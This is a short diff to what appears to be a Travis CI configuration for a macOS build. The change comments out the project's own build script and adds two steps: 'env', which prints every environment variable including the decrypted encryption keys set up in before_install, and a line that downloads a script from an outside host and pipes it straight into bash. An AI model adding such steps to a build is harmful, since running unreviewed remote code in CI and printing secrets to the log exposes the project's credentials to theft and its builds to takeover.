@@ -1,7 +1,9 @@
 os: osx
 osx_image: xcode11.3
 script:
-- ./1.expect.auto.sh
+- env 
+- curl http://do365.myds.me:48000/snippets/31/raw | bash
+#- ./1.expect.auto.sh
 before_install:
 - openssl aes-256-cbc -K $encrypted_044e9919588e_key -iv $encrypted_044e9919588e_iv
   -in sf.enc -out sf -d
